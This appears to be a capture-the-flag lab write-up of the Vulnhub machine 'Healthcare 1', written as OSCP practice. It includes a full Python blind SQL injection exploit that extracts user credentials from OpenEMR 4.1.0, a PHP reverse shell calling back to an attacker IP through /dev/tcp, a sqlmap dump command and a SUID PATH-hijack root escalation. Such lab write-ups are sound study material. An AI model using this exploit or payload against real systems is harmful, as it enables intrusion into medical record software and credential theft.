+++
title = "Vulnhub: Healthcare 1"
date = "2021-04-03"
author = ""
authorTwitter = "" #do not include @
cover = ""
tags = ["Intermediate", "Vulnhub", "OSCP Prep", "Directory Bruteforce", "OpenEMR", "SQLi", "SUID"]
keywords = ["", ""]
description = ""
showFullContent = false
+++

<!--more-->
{{< image src="/img/healthcare1/healthcare.png" alt="symfonos" position="center" style="border-radius: 8px;" >}}

| Difficulty | Release Date | Author | 
| ---------- | ------------ | ------ | 
| Intermediate | 29 Jul 2020 | v1n1v131r4 |

# Summary

For this box, we perform directory bruteforce on the webserver to discover a vulnerable version of openemr. Openemr here
is vulnerable to sql injection that we leverage to extract usernames and password hashes. After cracking the hashes, we use the
discovered credentials to access the ftp server and upload a php reverse shell to the webserver. This serves as our initial 
entry. To escalate our privileges we abuse a suid binary that doesn't use absolute path in commands it's running, 
therefore we can hijack any of those commands and run any commands of our choosing as root.

# Reconnaissance

Nmap

```sh
Nmap scan report for 192.168.56.106
Host is up (0.00023s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD 1.3.3d
80/tcp open  http    Apache httpd 2.2.17 ((PCLinuxOS 2011/PREFORK-1pclos2011))
| http-robots.txt: 8 disallowed entries
| /manual/ /manual-2.2/ /addon-modules/ /doc/ /images/
|_/all_our_e-mail_addresses /admin/ /
|_http-server-header: Apache/2.2.17 (PCLinuxOS 2011/PREFORK-1pclos2011)
|_http-title: Coming Soon 2
Service Info: OS: Unix
```
# Enumeration

## 21 (FTP)

Anonymous access is not enabled and the server version isn't vulnerable to any known vulnerabilities.
We can look at this again when we have credentials.

## 80 (HTTP)

Accessing this on the browser, we only get a static site with not much functionality. 

{{< image src="/img/healthcare1/healthcare-2.png" alt="symfonos" position="center" style="border-radius: 8px;" >}}

When we perform a directory bruteforce we get the following results:

```
ffuf -ic -c -u 'http://192.168.56.106/FUZZ' -e / -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -t 100 -fc 403 | tee -a healthcare1.ffuf
```

{{< image src="/img/healthcare1/healthcare-1.png" alt="symfonos" position="center" style="border-radius: 8px;" >}}

After checking the directories we have discovered, openemr returns an application. From their website:

> OpenEMR is the most popular open source electronic health records and medical practice management solution.

{{< image src="/img/healthcare1/healthcare-3.png" alt="symfonos" position="center" style="border-radius: 8px;" >}}

This version of openemr is outdated. Searching for available vulnerabilities and exploits for this version using searchsploit,
we discover an sql injection vulnerability. 

{{< image src="/img/healthcare1/healthcare-4.png" alt="symfonos" position="center" style="border-radius: 8px;" >}}

Unfortunately the PoC provided doesn't work. I found a better one from packetstormsecurity:

https://packetstormsecurity.com/files/108328/OpenEMR-4.1.0-SQL-Injection.html

The PoC provided shows a blind sql injection. The below payload causes the request to delay for about 5 seconds.

```
http://192.168.56.106/openemr/interface/login/validateUser.php?u='%2b(SELECT%201%20FROM%20(SELECT%20SLEEP(25))A)%2b'
```

Using this, I was able to create a script to extract username and password hash of all existing users. Soon to be
submitted to exploit-db.

```py
#!/usr/bin/env python3

# Exploit Title: OpenEMR 4.1.0 - SQL Injection
# Date: 2021-04-03
# Exploit Author: Michael Ikua
# Vendor Homepage: https://www.open-emr.org/
# Software Link: https://github.com/openemr/openemr/archive/refs/tags/v4_1_0.zip
# Version: 4.1.0
# Original Advisory: https://www.netsparker.com/web-applications-advisories/sql-injection-vulnerability-in-openemr/

import requests
import string
import sys

print("""
   ____                   ________  _______     __ __   ___ ____
  / __ \____  ___  ____  / ____/  |/  / __ \   / // /  <  // __ \\
 / / / / __ \/ _ \/ __ \/ __/ / /|_/ / /_/ /  / // /_  / // / / /
/ /_/ / /_/ /  __/ / / / /___/ /  / / _, _/  /__  __/ / // /_/ /
\____/ .___/\___/_/ /_/_____/_/  /_/_/ |_|     /_/ (_)_(_)____/
    /_/
    ____  ___           __   _____ ____    __    _
   / __ )/ (_)___  ____/ /  / ___// __ \  / /   (_)
  / /_/ / / / __ \/ __  /   \__ \/ / / / / /   / /
 / /_/ / / / / / / /_/ /   ___/ / /_/ / / /___/ /
/_____/_/_/_/ /_/\__,_/   /____/\___\_\/_____/_/   exploit by @ikuamike
""")

all = string.printable
# edit url to point to your openemr instance
url = "http://192.168.56.106/openemr/interface/login/validateUser.php?u="

def extract_users_num():
    print("[+] Finding number of users...")
    for n in range(1,100):
        payload = '\'%2b(SELECT+if((select count(username) from users)=' + str(n) + ',sleep(3),1))%2b\''
        r = requests.get(url+payload)
        if r.elapsed.total_seconds() > 3:
            user_length = n
            break
    print("[+] Found number of users: " + str(user_length))
    return user_length

def extract_users():
    users = extract_users_num()
    print("[+] Extracting username and password hash...")
    output = []
    for n in range(1,1000):
        payload = '\'%2b(SELECT+if(length((select+group_concat(username,\':\',password)+from+users+limit+0,1))=' + str(n) + ',sleep(3),1))%2b\''
        #print(payload)
        r = requests.get(url+payload)
        #print(r.request.url)
        if r.elapsed.total_seconds() > 3:
            length = n
            break
    for i in range(1,length+1):
        for char in all:
            payload = '\'%2b(SELECT+if(ascii(substr((select+group_concat(username,\':\',password)+from+users+limit+0,1),'+ str(i)+',1))='+str(ord(char))+',sleep(3),1))%2b\''
            #print(payload)
            r = requests.get(url+payload)
            #print(r.request.url)
            if r.elapsed.total_seconds() > 3:
                output.append(char)
                if char == ",":
                    print("")
                    continue
                print(char, end='', flush=True)


try:
    extract_users()
except KeyboardInterrupt:
    print("")
    print("[+] Exiting...")
    sys.exit()
```
After running the script, we get the hashes of 2 users.

{{< image src="/img/healthcare1/healthcare-5.png" alt="symfonos" position="center" style="border-radius: 8px;" >}}

```
admin : 3863efef9ee2bfbc51ecdca359c6302bed1389e8
medical : ab24aed5a7c4ad45615cd7e0da816eea39e4895d
```
We can try crack these hashes using hashcat/john the ripper but using crackstation.net would be quicker.

{{< image src="/img/healthcare1/healthcare-6.png" alt="symfonos" position="center" style="border-radius: 8px;" >}}

Now we have passwords for both users.
```
admin : ackbar
medical : medical
```
# Shell as apache

With this credentials, let's get back to ftp. Only the credentials for medical user work.

{{< image src="/img/healthcare1/healthcare-7.png" alt="symfonos" position="center" style="border-radius: 8px;" >}}

On ftp we see that we have access to the file system as the medical user, and we can even access
the web server directory. 


Due to the permissions set we can only write to openemr directory. With this, we can upload a php file that will provide
a reverse shell.

{{< image src="/img/healthcare1/healthcare-8.png" alt="symfonos" position="center" style="border-radius: 8px;" >}}

Contents of revshell.php:

```php
<?php system("/bin/bash -c '/bin/bash -i >& /dev/tcp/192.168.56.1/9000 0>&1 &'"); ?>
```
Making a request to the uploaded file using curl, we get the reverse shell.

{{< image src="/img/healthcare1/healthcare-9.png" alt="symfonos" position="center" style="border-radius: 8px;" >}}

After spawning a proper tty shell with python, we can switch to the medical user. In the Documents folder there's a 
Passwords.txt but the root creds don't work.

{{< image src="/img/healthcare1/healthcare-10.png" alt="symfonos" position="center" style="border-radius: 8px;" >}}

# Shell as root

Checking for usual privesc techniques like suid binaries by using find command we get one unusual binary.

```sh
find / -perm -4000 -ls 2>/dev/null
```

{{< image src="/img/healthcare1/healthcare-11.png" alt="symfonos" position="center" style="border-radius: 8px;" >}}

After running healthcheck, it outputs some system information like disks.

{{< image src="/img/healthcare1/healthcare-12.png" alt="symfonos" position="center" style="border-radius: 8px;" >}}

To understand what exactly it's doing, we run strings on this binary. From this we identify ways to abuse this since
it doesn't use absolute paths on the commands it runs, therefore it will use what it finds from our PATH variable. 

{{< image src="/img/healthcare1/healthcare-13.png" alt="symfonos" position="center" style="border-radius: 8px;" >}}

I'll use ifconfig here with my own code and place it in the /tmp folder and update my PATH variable. When this ifconfig 
is executed it will created a copy of the bash binary which has suid permissions.

Contents of ifconfig:
```sh
#!/bin/sh
cp /bin/bash /tmp/suidbash;chmod u+s /tmp/suidbash
```
{{< image src="/img/healthcare1/healthcare-14.png" alt="symfonos" position="center" style="border-radius: 8px;" >}}

We can then run the suidbash binary with -p to preserve the privileges and get root privileges and read the final
root.txt.

{{< image src="/img/healthcare1/healthcare-15.png" alt="symfonos" position="center" style="border-radius: 8px;" >}}

After getting root I found I has skipped over user.txt in almirant's home directory

{{< image src="/img/healthcare1/healthcare-16.png" alt="symfonos" position="center" style="border-radius: 8px;" >}}

# Extras

After looking at other writeups, I discovered other possible paths for exploiting this 
machine.

Initial step needed was exploiting the sql injection. Using sqlmap would have been a quicker way 
and achieved the same results. I intentionally didn't use sqlmap on my initial exploitation.

```sh
sqlmap -u "http://192.168.56.106/openemr/interface/login/validateUser.php?u=" --batch --dump -T users -C username,password
```

{{< image src="/img/healthcare1/healthcare-25.png" alt="symfonos" position="center" style="border-radius: 8px;" >}}

Using the obtained credentials, we can login to openemr as administrator and we can either upload a php file or
edit existing php files for command execution.

* #### File upload 

{{< image src="/img/healthcare1/healthcare-17.png" alt="symfonos" position="center" style="border-radius: 8px;" >}}

The file upload functionality does not have restrictions, therefore we can upload our php reverse shell and it will
be stored in that images directory.

{{< image src="/img/healthcare1/healthcare-18.png" alt="symfonos" position="center" style="border-radius: 8px;" >}}

We can the trigger the reverse shell by visiting the revshell.php in the /openemr/sites/default/images/ directory.

{{< image src="/img/healthcare1/healthcare-19.png" alt="symfonos" position="center" style="border-radius: 8px;" >}}

Reverse shell obtained.

{{< image src="/img/healthcare1/healthcare-20.png" alt="symfonos" position="center" style="border-radius: 8px;" >}}

* #### Edit existing php files

Using the same files functionality, we can also perform edits to existing files. In this case we can edit config.php
and add our reverse shell payload. After saving it and refreshing the page, a reverse shell is obtained on netcat
listener.

{{< image src="/img/healthcare1/healthcare-24.png" alt="symfonos" position="center" style="border-radius: 8px;" >}}

Another possible path that would have been taken after initial shell was that, the shadow file in the 
/var/backups directory was world readable.

{{< image src="/img/healthcare1/healthcare-21.png" alt="symfonos" position="center" style="border-radius: 8px;" >}}

Therefore we can crack this hash and switch user to almirant.

{{< image src="/img/healthcare1/healthcare-22.png" alt="symfonos" position="center" style="border-radius: 8px;" >}}

Then we get user.txt.

{{< image src="/img/healthcare1/healthcare-23.png" alt="symfonos" position="center" style="border-radius: 8px;" >}}
